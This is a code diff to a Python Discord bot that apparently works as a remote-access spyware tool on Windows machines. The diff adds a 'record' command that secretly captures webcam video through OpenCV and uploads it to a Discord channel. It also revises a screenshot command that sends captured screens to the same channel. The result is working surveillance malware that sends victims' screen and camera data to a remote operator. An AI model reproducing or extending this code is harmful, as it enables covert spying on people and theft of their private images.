@@ -6,7 +6,9 @@ import string
 import random
 import tempfile
 import winreg
-import pyautogui
+import pyscreenshot 
+import cv2
+
 
 # Load environment variables
 load_dotenv()
@@ -85,6 +87,7 @@ existing_session_name = exists(TEMP_DIR)
 
 @bot.event
 async def on_ready():
+    global session_name
     print(f'Logged in as {bot.user}!')
     
     guild = bot.get_guild(SERVER_ID)
@@ -114,26 +117,60 @@ async def on_ready():
 @bot.command(name='ss')
 async def screenshot(ctx):
     try:
-        screenshot = pyautogui.screenshot()
+        screenshot = pyscreenshot.grab()
         name = random_ascii(5) + ".png"  # Ensure file extension is added
         screenshot_path = os.path.join(TEMP_DIR, name)
         screenshot.save(screenshot_path)
         
-<<<<<<< HEAD
         # Send the screenshot
         with open(screenshot_path, 'rb') as f:
             await ctx.send(file=discord.File(f, 'Screenshot.png'))
-=======
-    print('don1e')    
->>>>>>> 8756ad8c3726133ad94f7533c212696985926bd3
         
         # Clean up
         os.remove(screenshot_path)
     except Exception as e:
         await ctx.send(f"An error occurred: {e}")
 
-@bot.command(name='obs')
-async def obs(ctx, seconds):
-    pass
+@bot.command(name='record')
+async def record_video(ctx, duration: int = 5):
+    """
+    Records a video using the webcam for the specified duration (in seconds)
+    and sends it to the Discord channel.
+    """
+    try:
+        # Initialize video capture (use cv2.CAP_DSHOW on Windows for DirectShow)
+        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+        if not cap.isOpened():
+            await ctx.send("Failed to open camera.")
+            return
+
+        # Define the codec and create a VideoWriter object (using .mp4 format)
+        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
+        video_path = os.path.join(tempfile.gettempdir(), "recorded_video.mp4")
+        out = cv2.VideoWriter(video_path, fourcc, 20.0, (640, 480))
+
+        # Record video for the specified duration
+        frames_to_record = duration * 20  # 20 FPS
+        frame_count = 0
+        while cap.isOpened() and frame_count < frames_to_record:
+            ret, frame = cap.read()
+            if not ret:
+                break
+            out.write(frame)
+            frame_count += 1
+
+        # Release the capture and writer objects
+        cap.release()
+        out.release()
+
+        # Send the video file as an attachment
+        with open(video_path, 'rb') as f:
+            await ctx.send(file=discord.File(f, 'recorded_video.mp4'))
+
+        # Clean up by removing the saved video file
+        os.remove(video_path)
+
+    except Exception as e:
+        await ctx.send(f"An error occurred: {e}")
 
 bot.run(TOKEN)
